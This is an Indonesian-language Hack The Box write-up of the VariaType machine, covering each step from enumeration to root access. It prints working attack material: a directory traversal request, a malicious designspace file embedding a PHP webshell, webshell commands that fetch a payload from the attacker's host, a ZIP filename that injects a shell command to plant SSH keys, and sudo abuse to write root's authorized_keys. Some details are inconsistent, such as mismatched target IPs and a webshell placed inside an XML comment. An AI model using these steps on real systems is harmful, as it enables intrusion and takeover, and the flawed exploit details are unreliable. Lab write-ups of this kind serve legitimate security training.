# VariaType — HackTheBox Write-up

> **Platform:** Hack The Box  
> **Nama Mesin:** VariaType  
> **Tingkat Kesulitan:** Medium  
> **OS:** Linux  
> **Status:** Retired  

---

## Daftar Isi

1. [Tentang Mesin](#tentang-mesin)
2. [Koneksi ke HTB](#koneksi-ke-htb)
3. [Enumerasi Nmap](#enumerasi-nmap)
4. [Konfigurasi Host Resolution](#konfigurasi-host-resolution)
5. [Penemuan Git Repository yang Terbuka](#penemuan-git-repository-yang-terbuka)
6. [Ekstraksi Repository Git](#ekstraksi-repository-git)
7. [Analisis Riwayat Git](#analisis-riwayat-git)
8. [Autentikasi dan File Disclosure](#autentikasi-dan-file-disclosure)
9. [Pengembangan Eksploit — CVE-2025-66034](#pengembangan-eksploit--cve-2025-66034)
10. [Remote Code Execution](#remote-code-execution)
11. [Pembuatan SSH Key](#pembuatan-ssh-key)
12. [Persiapan Privilege Escalation](#persiapan-privilege-escalation)
13. [Pengiriman Payload](#pengiriman-payload)
14. [Akses User dan Pengambilan Flag](#akses-user-dan-pengambilan-flag)
15. [Enumerasi Privilege Escalation](#enumerasi-privilege-escalation)
16. [Persiapan Akses Root](#persiapan-akses-root)
17. [Hosting Root Public Key](#hosting-root-public-key)
18. [Privilege Escalation ke Root](#privilege-escalation-ke-root)

---

## Tentang Mesin

VariaType adalah mesin Linux dengan tingkat kesulitan **Medium** di platform Hack The Box yang menggambarkan bagaimana serangkaian miskonfigurasi yang dirantai bersama, ditambah praktik pengembangan yang tidak aman, bisa berujung pada kompromi sistem secara penuh.

Serangan dimulai dengan **enumerasi Nmap** untuk menemukan port yang terbuka, dilanjutkan dengan pengaturan resolusi host agar aplikasi web dapat diakses dengan benar. Dari sana, ditemukan sebuah **direktori `.git` yang terbuka secara publik**, memungkinkan ekstraksi seluruh repository dan analisis riwayat commit untuk menemukan kredensial yang pernah di-hardcode namun tidak terhapus dari histori.

Menggunakan kredensial tersebut, autentikasi ke portal berhasil dilakukan, mengungkap kerentanan **directory traversal** pada endpoint unduhan file. Fokus kemudian beralih ke **CVE-2025-66034**, sebuah celah Arbitrary File Write melalui XML Injection pada `fontTools.varLib`, yang dieksploitasi untuk menulis PHP webshell ke dalam web root dan memperoleh **Remote Code Execution (RCE)**.

Setelah mendapatkan eksekusi perintah, dilakukan pembuatan SSH key pair, diikuti dengan pengiriman payload ZIP berbahaya yang menyalahgunakan pemrosesan tidak aman dari scheduled task, sehingga berhasil menyuntikkan public key ke direktori `.ssh` milik user `steve`. Akses SSH pun terbuka.

Pada tahap akhir, ditemukan aturan `sudo` yang salah konfigurasi yang mengizinkan eksekusi skrip Python sebagai root. Skrip tersebut dimanfaatkan untuk menulis SSH key root ke `/root/.ssh/authorized_keys`, memberikan **akses penuh sebagai root**.

Secara keseluruhan, mesin ini menyoroti bahaya nyata dari repository yang terbuka, penanganan file yang tidak aman, dan manajemen hak akses yang lemah.

![Tampilan Mesin VariaType di HackTheBox](01-machine-info.png)

---

## Koneksi ke HTB

Langkah pertama adalah menghubungkan terminal Kali Linux ke jaringan Hack The Box melalui VPN. Perintah yang dijalankan:

```bash
sudo openvpn ~/Downloads/OpenVPN/variatype.ovpn
```

![Koneksi VPN ke Hack The Box berhasil](02-vpn-connect_01.png)
![Koneksi VPN ke Hack The Box berhasil_02](02-vpn-connect_02.png)

Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan alamat IP target: **10.129.11.170**.

![Mesin VariaType aktif dengan IP yang ditetapkan](03-machine-started.png)

---

## Enumerasi Nmap

Dengan IP target di tangan, pemindaian Nmap dijalankan untuk mengidentifikasi port yang terbuka beserta layanan yang berjalan di dalamnya:

```bash
nmap -sC -sV -A -O -T4 -oN variaType_nmap.txt 10.129.42.177
```

![Hasil pemindaian Nmap pada mesin VariaType](04-nmap-scan.png)

Hasil pemindaian mengungkap dua port yang aktif:

- **Port 22 (SSH)** — menjalankan OpenSSH 9.2p1 di atas Debian
- **Port 80 (HTTP)** — dilayani oleh nginx 1.22.1, yang langsung melakukan redirect ke `variatype.htb`

Adanya redirect ke domain virtual host mengisyaratkan bahwa nama domain tersebut perlu ditambahkan secara manual ke file `/etc/hosts` agar bisa diakses dengan benar. Sementara SSH disimpan sebagai opsi akses berbasis kredensial untuk tahap berikutnya, fokus utama diarahkan ke enumerasi web.

---

## Konfigurasi Host Resolution

Karena layanan web melakukan redirect ke domain kustom, entri baru harus ditambahkan ke file resolusi host lokal agar permintaan bisa diarahkan dengan tepat:

```bash
echo "10.129.11.170 variatype.htb" | sudo tee -a /etc/hosts
```

![Penambahan entri host untuk variatype.htb](05-hosts-config.png)

### Penemuan subdomain `portal` menggunakan ffuf
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    -H "Host: FUZZ.variatype.htb" -u http://variatype.htb -mc 200,302,401,403
```
![Penambahan entri host untuk portal.variatype.htb](05-hosts-config_ffuf.png)

Selain domain utama, subdomain `portal.variatype.htb` juga ditambakan karena terdeteksi saat melakukan pemindaia subdomain menggunaka ffuf. Dengan konfigurasi ini, interaksi dengan aplikasi web dapat berjalan sebagaimana mestinya — bukan sekadar menggunakan alamat IP mentah.

Setelah resolusi host siap, penelusuran terhadap kedua domain pun dimulai untuk memetakan fungsionalitas yang tersedia.

---

## Penemuan Git Repository yang Terbuka

Saat melakukan enumerasi pada subdomain `portal.variatype.htb` menggunakan feroxbuster, ditemukan sebuah miskonfigurasi kritis: 
```bash
feroxbuster -u http://portal.variatype.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --scan-dir-listings
```
![Direktori .git terbuka secara publik pada portal.variatype.htb_01](git_subdir_found.png)

Direktori `.git` dapat diakses secara publik melalui browser maupun permintaan HTTP biasa:

```bash
curl http://portal.variatype.htb/.git/HEAD
```

![Direktori .git terbuka secara publik pada portal.variatype.htb](06-git-exposure.png)

Respons yang dikembalikan adalah:

```
ref: refs/heads/master
```

Konfirmasi ini menunjukkan bahwa repository Git di server dapat diakses sepenuhnya dari luar. Artinya, seluruh source code aplikasi — termasuk konfigurasi dan potensi kredensial — berpotensi bisa diambil.

Temuan ini dikategorikan sebagai **information disclosure kritis**, dan langkah selanjutnya adalah mengekstrak isi repository tersebut untuk dianalisis secara offline.

---

## Ekstraksi Repository Git

Setelah memastikan direktori `.git` dapat diakses, sebuah tool digunakan untuk mengotomasi proses pengambilan repository secara menyeluruh. Pertama, tool tersebut diinstal:

```bash
pip install git-dumper
```

![Instalasi git-dumper untuk mengekstrak repository yang terbuka](07-git-dumper-install.png)

Kemudian repository diambil dari target:

```bash
git-dumper http://portal.variatype.htb/.git ./portal-repo
```

![Proses ekstraksi repository Git dari server target](08-git-dump.png)

Output menampilkan serangkaian respons `200 OK` untuk file-file Git penting seperti `HEAD`, `config`, `index`, dan berbagai object file — membuktikan bahwa repository dapat direkonstruksi secara lokal. Tool secara otomatis menjalankan `git checkout` untuk membangun kembali working tree, memberikan akses penuh ke source code aplikasi.

Tahap berikutnya adalah menelusuri kode tersebut untuk mencari informasi sensitif seperti kredensial, kunci API, atau celah keamanan lainnya.

---

## Analisis Riwayat Git

Dengan repository berhasil diunduh, penelusuran terhadap histori commit dimulai untuk menggali informasi yang mungkin pernah tersimpan namun kemudian dihapus:

```bash
cd portal-repo
git log --oneline
```

![Daftar commit pada repository yang berhasil diekstrak](09-git-log.png)

Salah satu commit menyebut nama pengguna **gitbot**, yang langsung menarik perhatian. Untuk menemukan commit yang mungkin sudah dihapus atau tidak lagi terhubung ke branch aktif, digunakan perintah berikut:

```bash
git fsck --no-reflog --full --unreachable | grep commit
```

![Penemuan unreachable commit melalui git fsck](10-git-fsck.png)

Hasilnya mengungkap adanya **unreachable commit** — sebuah indikasi bahwa konten yang pernah dihapus masih tersimpan dalam objek Git. Commit tersebut kemudian diperiksa secara langsung:

```bash
git show 6f021da6be7086f2595befaa025a83d1de99478b
```

![Isi unreachable commit yang mengandung kredensial hardcoded](11-git-show.png)

Pesan commit bertuliskan *"remove hardcoded credentials"*, dan diff-nya memperlihatkan kredensial milik user `gitbot` yang pernah tertanam langsung dalam kode. Meski sudah dihapus dari versi terkini, data tersebut tetap bisa diakses melalui histori Git — memberikan jalur masuk yang valid untuk eksploitasi berikutnya.

---

## Autentikasi dan File Disclosure

Memanfaatkan kredensial `gitbot` yang ditemukan dari riwayat Git, proses autentikasi ke portal dilakukan dan session cookie disimpan untuk digunakan pada permintaan selanjutnya:

![Autentikasi berhasil menggunakan kredensial gitbot dari histori Git](12-auth-login.png)

Setelah mengekstrak `PHPSESSID` dari proses autentikasi sebelumnya, dilakukan percobaan akses ke endpoint unduhan file dengan memanfaatkan parameter yang mencurigakan:

```bash
curl -s -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" \
    "http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"
```

![Directory traversal berhasil membaca /etc/passwd dari server](13-file-disclosure.png)

Server mengembalikan isi file `/etc/passwd` secara lengkap, mengonfirmasi adanya **kerentanan directory traversal** pada parameter endpoint tersebut. Dari output yang diperoleh, teridentifikasi user bernama `steve` — informasi yang akan berguna pada tahap selanjutnya.

Meski demikian, endpoint `download.php` ini hanya menawarkan akses baca file, sehingga diputuskan untuk mencari vektor serangan yang lebih menjanjikan.

---

## Pengembangan Eksploit — CVE-2025-66034

Setelah menyadari bahwa `download.php` bukan jalur yang optimal, fokus beralih ke celah yang lebih berbahaya: **CVE-2025-66034**, sebuah kerentanan Arbitrary File Write melalui XML Injection pada library `fontTools.varLib`.

Langkah pertama adalah membuat dua file font minimal yang diperlukan sebagai referensi dalam designspace berbahaya:

```bash
python3 generate_fonts.py
```

![Pembuatan font source-light.ttf dan source-regular.ttf untuk eksploit](14-font-generation.png)

File `source-light.ttf` dan `source-regular.ttf` berhasil dibuat. Selanjutnya, sebuah file `.designspace` berbahaya dikonstruksi dengan menyematkan PHP webshell di dalam blok CDATA, sekaligus menentukan path output ke lokasi yang dapat diakses melalui web:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<designspace format="4.1">
  <sources>
    <source filename="source-light.ttf" familyname="SourceTest" stylename="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" familyname="SourceTest" stylename="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <instances>
    <instance
      filename="/var/www/portal.variatype.htb/public/files/shell.php"
      familyname="SourceTest"
      stylename="Medium">
      <location><dimension name="Weight" xvalue="250"/></location>
      <kerning/>
      <info/>
    </instance>
  </instances>
  <!-- <![CDATA[ <?php system($_GET['cmd']); ?> ]]> -->
</designspace>
```

Tujuan dari konstruksi ini adalah mengeksploitasi pipeline pemrosesan font untuk menulis file PHP berisi webshell langsung ke dalam web root server, membuka jalan menuju eksekusi perintah dari jarak jauh.

---

## Remote Code Execution

Setelah semua file siap — designspace berbahaya beserta dua font pendukungnya — ketiganya diunggah ke endpoint pemrosesan font yang rentan:

```bash
curl -s -b cookies.txt \
  -F "designspace=@evil.designspace" \
  -F "font1=@source-light.ttf" \
  -F "font2=@source-regular.ttf" \
  http://portal.variatype.htb/process.php
```

![Upload file berbahaya ke endpoint pemrosesan font](15-file-upload.png)

Server merespons dengan pesan **"Processing completed"**, menandakan bahwa payload berhasil diproses. Karena designspace mengarahkan output ke dalam web root, kemungkinan besar file PHP sudah tertulis di sana. Verifikasi dilakukan dengan mengakses shell tersebut:

```bash
curl "http://portal.variatype.htb/public/files/shell.php?cmd=id"
```

![RCE berhasil — perintah id dieksekusi melalui webshell](16-rce-execution.png)

Eksekusi berhasil — output menampilkan identitas user yang menjalankan proses web server. **Remote Code Execution (RCE)** telah tercapai, membuka akses ke sistem target.

---

## Pembuatan SSH Key

Dengan RCE di tangan, langkah berikutnya adalah membangun metode akses yang lebih stabil dan andal. Sebuah SSH key pair baru dibuat secara lokal untuk dipersiapkan bagi user `steve`:

```bash
ssh-keygen -t ed25519 -f steve_key -N ""
```

![Pembuatan SSH key pair untuk user steve](17-ssh-keygen.png)

Proses ini menghasilkan dua file: `steve_key` (private key) dan `steve_key.pub` (public key) tanpa passphrase. Rencana selanjutnya adalah menyuntikkan public key tersebut ke dalam file `~/.ssh/authorized_keys` milik `steve` melalui RCE yang sudah dimiliki, sehingga login SSH tanpa password bisa dilakukan kapan saja.

---

## Persiapan Privilege Escalation

Untuk mendapatkan akses sebagai `steve`, perlu ada mekanisme yang menyuntikkan public key ke direktori `.ssh`-nya. Cara yang dipilih adalah membuat arsip ZIP berbahaya yang mengeksploitasi kerentanan command injection dalam alur pemrosesan font — kemungkinan besar dijalankan oleh scheduled job berbasis FontForge.

```bash
# Buat direktori dummy untuk dijadikan isi ZIP
mkdir exploit-zip

# Nama file mengandung command substitution — akan dieksekusi saat diproses
PUB_KEY=$(cat steve_key.pub)
FILENAME="$(mkdir -p /home/steve/.ssh && echo '${PUB_KEY}' >> /home/steve/.ssh/authorized_keys && echo done).ttf"

# Buat file kosong dengan nama berbahaya
touch "exploit-zip/${FILENAME}"

# Kemas ke dalam ZIP
cd exploit-zip && zip ../evil.zip * && cd ..
```

![Pembuatan evil.zip dengan nama file yang mengandung command injection](18-evil-zip.png)

Skrip ini menyematkan public key SSH langsung ke dalam nama file menggunakan command substitution. Saat arsip diproses oleh sistem target, perintah tersebut akan dieksekusi, menciptakan file `authorized_keys` di direktori `.ssh` milik `steve` dan memasukkan public key ke dalamnya. Setelah `evil.zip` siap, langkah selanjutnya adalah mengirimkannya ke target.

---

## Pengiriman Payload

Untuk menyerahkan arsip berbahaya ke sistem target, sebuah HTTP server sederhana dijalankan secara lokal agar file bisa diunduh dari sana:

```bash
python3 -m http.server 8080
```

![Python HTTP server aktif untuk melayani evil.zip](19-http-server.png)

Dari log server, terlihat permintaan `GET /evil.zip` masuk — bukti bahwa target berhasil mengambil file tersebut. Namun untuk memastikan payload benar-benar tersalin ke lokasi yang diproses oleh scheduled task, webshell digunakan untuk secara eksplisit mengunduhnya ke server:

```bash
curl "http://portal.variatype.htb/public/files/shell.php?cmd=wget+http://10.10.14.X:8080/evil.zip+-O+/var/www/portal.variatype.htb/uploads/evil.zip"
```

![Payload evil.zip berhasil diunduh ke direktori target melalui webshell](20-payload-delivery.png)

Dengan payload sudah berada di lokasi yang tepat, tinggal menunggu scheduled job memprosesnya. Begitu itu terjadi, public key akan tersuntikkan ke `authorized_keys` milik `steve`, dan akses SSH pun siap dibuka.

---

## Akses User dan Pengambilan Flag

Setelah menunggu beberapa saat agar payload diproses, koneksi SSH dicoba menggunakan private key yang telah dibuat sebelumnya:

```bash
ssh -i steve_key steve@10.129.11.170
```

![SSH berhasil masuk sebagai user steve](21-ssh-user-access.png)

Koneksi berhasil terhubung tanpa meminta password — mengonfirmasi bahwa public key sudah tersuntikkan dengan sukses ke `authorized_keys` milik `steve`. Identitas user diverifikasi dengan menjalankan `whoami`, yang mengembalikan output `steve`. User flag kemudian diambil dari direktori home:

```bash
cat ~/user.txt
```

Akses penuh sebagai user `steve` telah terbukti. Kini saatnya beralih ke tahap eskalasi privileges untuk meraih kontrol penuh atas sistem.

---

## Enumerasi Privilege Escalation

Setelah mendapatkan shell SSH sebagai `steve`, enumerasi dimulai untuk mengidentifikasi jalur yang memungkinkan peningkatan hak akses:

```bash
sudo -l
```

![Output sudo -l menampilkan aturan yang bisa dieksploitasi](22-sudo-enum.png)

Hasil perintah mengungkap bahwa `steve` diizinkan menjalankan skrip Python tertentu sebagai root tanpa memerlukan password:

```
(ALL) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Aturan `sudo` ini sangat menarik karena skrip menerima argumen tambahan (ditandai dengan `*`), mengisyaratkan kemungkinan penyalahgunaan melalui manipulasi input. Dengan skrip tersebut berjalan di bawah hak root, analisis mendalam terhadapnya menjadi prioritas berikutnya dalam rangka menguasai sistem sepenuhnya.

---

## Persiapan Akses Root

Setelah mengidentifikasi skrip yang bisa dieksploitasi, sebuah SSH key pair baru disiapkan khusus untuk akses root:

```bash
ssh-keygen -t ed25519 -f root_key -N ""
```

![Pembuatan SSH key pair untuk akses root](23-root-keygen.png)

Dua file dihasilkan: `root_key` sebagai private key dan `root_key.pub` sebagai public key. Strategi yang direncanakan adalah memanfaatkan skrip Python yang berjalan dengan hak root untuk menulis isi `root_key.pub` ke dalam file `/root/.ssh/authorized_keys`, sehingga akses SSH langsung sebagai root bisa dilakukan menggunakan private key yang dimiliki.

---

## Hosting Root Public Key

Agar skrip Python yang berjalan sebagai root bisa mengambil public key dari mesin penyerang, sebuah HTTP server disiapkan untuk melayani file tersebut:

```python
# server.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        with open("root_key.pub", "rb") as f:
            self.wfile.write(f.read())

HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
```

```bash
python3 server.py
```

![HTTP server berjalan untuk melayani root_key.pub](24-key-hosting.png)

Server ini dikonfigurasi untuk mengembalikan konten `root_key.pub` setiap kali ada permintaan masuk. Dengan server aktif, target siap diperintahkan untuk mengambil file tersebut melalui skrip Python yang dijalankan dengan sudo.

---

## Privilege Escalation ke Root

Dengan semua persiapan selesai, eksploitasi final dijalankan. Skrip Python yang bisa dieksekusi sebagai root dimanfaatkan untuk mengambil public key dari mesin penyerang dan menulisnya langsung ke `/root/.ssh/authorized_keys`:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.14.X:9090/root_key.pub" \
  --output /root/.ssh/authorized_keys
```

![Eksploitasi sudo berhasil menulis root public key ke authorized_keys](25-privesc-exploit.png)

Output mengonfirmasi bahwa file berhasil diunduh dan dipasang di `/root/.ssh/authorized_keys`. Koneksi SSH sebagai root pun langsung dicoba:

```bash
ssh -i root_key root@10.129.11.170
```

![SSH sebagai root berhasil — sistem berhasil dikuasai sepenuhnya](26-root-access.png)

Shell root terbuka. Perintah `whoami` mengembalikan `root`, dan root flag berhasil diambil:

```bash
cat /root/root.txt
```

**Mesin VariaType berhasil dikuasai sepenuhnya.**

---

## Rangkuman Serangan

| Tahap | Teknik | Hasil |
|---|---|---|
| Reconnaissance | Nmap scan | Port 22, 80 ditemukan |
| Web Enumeration | Virtual host discovery | `variatype.htb`, `portal.variatype.htb` |
| Information Disclosure | Git repository exposure | Source code dan histori commit dapat diakses |
| Credential Harvesting | Git history analysis | Kredensial `gitbot` ditemukan |
| File Read | Directory traversal via `download.php` | Konfirmasi user `steve` |
| RCE | CVE-2025-66034 — XML Injection + Arbitrary File Write | PHP webshell tertanam di web root |
| Persistence | SSH key injection via malicious ZIP | Akses SSH sebagai `steve` |
| Privilege Escalation | Misconfigured `sudo` rule pada Python script | Akses penuh sebagai `root` |

---

## Pelajaran yang Bisa Dipetik

- **Jangan pernah membiarkan direktori `.git` dapat diakses publik** di server produksi. Gunakan konfigurasi web server atau `.htaccess` untuk memblokirnya.
- **Histori Git menyimpan segalanya** — menghapus kredensial dari kode terbaru tidak cukup; riwayat commit tetap menyimpannya. Gunakan `git filter-branch` atau `BFG Repo-Cleaner` untuk menghapus data sensitif secara permanen.
- **Validasi ketat pada input yang diterima untuk pemrosesan file** sangat penting. Nama file, path, dan konten XML harus disanitasi sebelum diproses.
- **Aturan `sudo` harus dirumuskan seketat mungkin** — hindari penggunaan wildcard (`*`) yang memungkinkan injeksi argumen tidak terduga.
- **Scheduled task yang memproses file dari direktori yang dapat ditulis pengguna** menciptakan permukaan serangan yang sangat berbahaya.
